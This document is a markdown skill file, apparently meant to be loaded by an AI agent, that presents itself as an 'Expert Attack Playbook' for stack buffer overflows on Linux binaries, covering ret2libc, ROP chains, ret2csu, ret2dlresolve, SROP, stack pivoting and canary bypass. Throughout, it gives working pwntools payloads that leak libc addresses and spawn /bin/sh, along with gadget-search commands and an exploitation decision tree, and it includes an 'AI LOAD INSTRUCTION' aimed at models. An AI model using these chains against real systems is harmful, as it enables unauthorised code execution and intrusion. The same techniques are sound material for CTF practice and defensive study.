---
name: stack-overflow-and-rop
description: >-
  Stack overflow and ROP playbook. Use when exploiting buffer overflows to hijack control flow via return address overwrite, ROP chains, ret2libc, ret2csu, ret2dlresolve, or SROP on Linux userland binaries.
---

# SKILL: Stack Overflow & ROP — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert stack-based exploitation techniques. Covers classic buffer overflow, return-to-libc, ROP chain construction, ret2csu, ret2dlresolve, SROP, stack pivoting, and canary bypass. Distilled from ctf-wiki advanced-rop, real-world CVEs, and CTF competition patterns. Base models often miss the nuance of gadget selection under constrained conditions.

## 0. RELATED ROUTING

- [format-string-exploitation](../format-string-exploitation/SKILL.md) — leak canary/libc/PIE base via format string before triggering overflow
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — systematic bypass of NX, ASLR, PIE, canary, RELRO
- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) — convert a write primitive (GOT, hooks, vtable) into code execution
- [heap-exploitation](../heap-exploitation/SKILL.md) — when the vulnerability is in heap rather than stack

### Advanced Reference

Load [ROP_ADVANCED_TECHNIQUES.md](./ROP_ADVANCED_TECHNIQUES.md) when you need:
- Blind ROP (BROP) methodology against remote services without binary
- ret2vdso for ASLR bypass on 32-bit systems
- Partial overwrite techniques for PIE bypass
- JOP / COP alternative code-reuse paradigms

---

## 1. STACK LAYOUT FUNDAMENTALS

```
High Address
┌─────────────────────┐
│   ...  (caller)     │
├─────────────────────┤
│   Return Address    │  ← overwrite target (EIP/RIP control)
├─────────────────────┤
│   Saved EBP/RBP     │  ← overwrite for stack pivoting
├─────────────────────┤
│   Canary (if enabled)│
├─────────────────────┤
│   Local Variables    │  ← buffer starts here
├─────────────────────┤
│   ...               │
└─────────────────────┘
Low Address
```

| Element | x86 (32-bit) | x86-64 (64-bit) |
|---|---|---|
| Return address size | 4 bytes | 8 bytes |
| Saved frame pointer | 4 bytes (EBP) | 8 bytes (RBP) |
| Canary size | 4 bytes | 8 bytes |
| Calling convention | args on stack | RDI, RSI, RDX, RCX, R8, R9 then stack |
| Syscall instruction | `int 0x80` | `syscall` |

---

## 2. RETURN-TO-LIBC

When NX is enabled (stack not executable), redirect execution to libc functions.

### Classic ret2libc (32-bit)

```python
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)      # fake return address for system()
payload += p32(binsh_addr)     # arg1: "/bin/sh"
```

### ret2libc (64-bit) — Need Gadgets for Arguments

```python
pop_rdi = elf_base + 0x401234  # pop rdi; ret
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### Libc Base Leak Methods

| Method | Technique | When |
|---|---|---|
| puts@plt(puts@GOT) | Leak resolved libc address | GOT already resolved, puts in PLT |
| write@plt(1, read@GOT, 8) | Leak via write syscall | write available |
| printf("%s", GOT_entry) | Leak via format string | printf controllable |
| Partial overwrite | Overwrite low bytes of return to reach leak gadget | PIE enabled, known last 12 bits |

```python
# Typical leak pattern
rop = b'A' * offset
rop += p64(pop_rdi) + p64(elf.got['puts'])
rop += p64(elf.plt['puts'])
rop += p64(main_addr)  # return to main for second payload

io.sendline(rop)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
```

### one_gadget — Single Gadget RCE

```bash
$ one_gadget /path/to/libc.so.6
0x4f3d5  execve("/bin/sh", rsp+0x40, environ)
  constraints: rsp & 0xf == 0, rcx == NULL
0x4f432  execve("/bin/sh", rsp+0x40, environ)
  constraints: [rsp+0x40] == NULL
```

Constraints must be satisfied — check register/stack state before using.

---

## 3. ROP CHAIN CONSTRUCTION

### Tool Comparison

| Tool | Strength | Command |
|---|---|---|
| ROPgadget | Comprehensive search, chain generation | `ROPgadget --binary elf --ropchain` |
| ropper | Semantic search, JOP/COP support | `ropper -f elf --search "pop rdi"` |
| pwntools ROP | Automated chain building | `rop = ROP(elf); rop.call('system', ['/bin/sh'])` |
| xrop | Fast gadget search | `xrop -r elf` |

### Essential Gadget Patterns

| Purpose | Gadget | Use Case |
|---|---|---|
| Set RDI (arg1) | `pop rdi; ret` | Most function calls |
| Set RSI (arg2) | `pop rsi; pop r15; ret` | Two-arg functions |
| Set RDX (arg3) | `pop rdx; ret` (rare) | Three-arg functions, use ret2csu |
| Syscall | `syscall; ret` | Direct syscall invocation |
| Stack pivot | `leave; ret` | Move RSP to controlled buffer |
| Align stack | `ret` (single ret gadget) | Fix 16-byte alignment for movaps |

**x86-64 stack alignment**: `system()` and other libc functions use `movaps` which requires RSP % 16 == 0. Insert an extra `ret` gadget before the call if alignment is off.

---

## 4. ret2csu — Universal 3-Argument Control

`__libc_csu_init` exists in nearly all dynamically linked ELF binaries and provides controlled calls with up to 3 arguments.

```nasm
; Gadget 1 (csu_init + 0x3a): pop registers
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; call target (function pointer address)
pop r13     ; arg3 (rdx)
pop r14     ; arg2 (rsi)
pop r15     ; arg1 (edi = r15d)
ret

; Gadget 2 (csu_init + 0x20): controlled call
mov rdx, r13
mov rsi, r14
mov edi, r15d    ; NOTE: only sets edi (32-bit), not full rdi
call [r12 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne <loop>
; falls through to gadget 1 again
```

**Key constraints**: r12 must point to a **pointer** to the target function (e.g., GOT entry), not the function address directly. Set `rbx=0`, `rbp=1` to skip the loop.

---

## 5. ret2dlresolve

Forge ELF dynamic linking structures to resolve an arbitrary function (e.g., `system`) without a libc leak.

### Attack Flow

1. Control execution to call `_dl_runtime_resolve(link_map, reloc_offset)`
2. Forge `Elf_Rel` at known writable address pointing to fake `Elf_Sym`
3. Forge `Elf_Sym` with `st_name` pointing to fake string `"system\x00"`
4. Set `reloc_offset` so resolver uses forged structures
5. Argument (`/bin/sh`) placed on stack or in known buffer

```python
# pwntools automation (recommended)
from pwntools import *
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
io.sendline(rop.chain())
io.sendline(dlresolve.payload)
```

### 32-bit vs 64-bit Differences

| Aspect | 32-bit | 64-bit |
|---|---|---|
| Relocation type | `Elf32_Rel` (8 bytes) | `Elf64_Rela` (24 bytes) |
| Symbol table entry | `Elf32_Sym` (16 bytes) | `Elf64_Sym` (24 bytes) |
| Alignment | Relaxed | Strict (must satisfy `ndx = (reloc_offset) / sizeof(Elf64_Rela)`, then `sym = symtab[ndx]`) |
| Version check | Usually skippable | `VERSYM[sym_index]` must be valid or 0 |

---

## 6. SROP — Sigreturn-Oriented Programming

Abuse the `sigreturn` syscall to set **all registers at once** from a fake Signal Frame on the stack.

```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_addr
frame.rsp = new_stack_addr  # optional pivot

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15
payload += p64(syscall_ret)
payload += bytes(frame)
```

**When to use**: limited gadgets, no `pop rdx`, static binary, or need to pivot stack to arbitrary address.

---

## 7. STACK PIVOTING

Move the stack pointer to an attacker-controlled buffer when overflow length is limited.

| Technique | Gadget | Precondition |
|---|---|---|
| `leave; ret` | `mov rsp, rbp; pop rbp; ret` | Control saved RBP to point to fake stack |
| `xchg rsp, rax; ret` | Swap RSP with RAX | Control RAX (via gadget chain) |
| `pop rsp; ret` | Direct RSP control | Rare but powerful |
| SROP pivot | Set RSP in SigreturnFrame | Only need sigreturn gadget |

### leave;ret Pivot Pattern

```
Overflow: [AAAA...][fake_rbp → buf][leave_ret_addr]
  1st leave: rsp = rbp → fake_rbp;  pop rbp → *fake_rbp
  1st ret:   rip = leave_ret_addr
  2nd leave: rsp = new_rbp → buf+8; pop rbp → *(buf)
  2nd ret:   rip = *(buf+8) → start of ROP chain in buf
```

---

## 8. CANARY BYPASS

| Technique | Condition | Method |
|---|---|---|
| Brute-force | `fork()` server (canary same in child) | Byte-by-byte (256 × 7 = 1792 attempts for 64-bit) |
| Format string leak | printf(user_input) available | `%N$p` to read canary from stack |
| Stack reading | One-byte overflow or partial read | Overwrite canary null byte, read via error/output |
| Thread canary | Overflow reaches TLS | Overwrite `stack_guard` in TLS (at `fs:[0x28]`) simultaneously |
| Information disclosure | Uninitialized stack variable leak | Canary included in leaked data |

---

## 9. TOOLS QUICK REFERENCE

```bash
checksec ./binary                          # Show protections (NX, canary, PIE, RELRO)
ROPgadget --binary ./binary --ropchain     # Auto-generate ROP chain
ropper -f ./binary --search "pop rdi"      # Semantic gadget search
one_gadget ./libc.so.6                     # Find one-shot RCE gadgets
pwn template ./binary --host x --port y    # Generate pwntools exploit skeleton
```

---

## 10. DECISION TREE

```
Binary has stack overflow?
├── checksec: NX disabled?
│   └── YES → shellcode on stack, ret to buffer (ret2shellcode)
│   └── NO (NX enabled) →
│       ├── Canary enabled?
│       │   ├── YES → fork() server? → brute-force canary
│       │   │         format string? → leak canary
│       │   │         info leak?     → read canary
│       │   └── NO → proceed to ROP
│       ├── ASLR/PIE enabled?
│       │   ├── PIE → leak code base (partial overwrite last 12 bits, or info leak)
│       │   ├── ASLR only → leak libc base (puts@GOT, write@GOT)
│       │   └── Neither → addresses known, direct ROP
│       ├── Can leak libc?
│       │   ├── YES → ret2libc (system/execve) or one_gadget
│       │   └── NO → ret2dlresolve (forge resolution) or SROP
│       ├── Need 3+ args but no pop rdx?
│       │   └── ret2csu or SROP
│       ├── Overflow too short for full chain?
│       │   └── Stack pivot (leave;ret, xchg rsp)
│       ├── Static binary (no libc)?
│       │   └── SROP + syscall chain (execve via sigreturn)
│       └── Full RELRO?
│           └── Cannot overwrite GOT → target __free_hook, __malloc_hook,
│               or _IO_FILE vtable (see ../arbitrary-write-to-rce/)
```
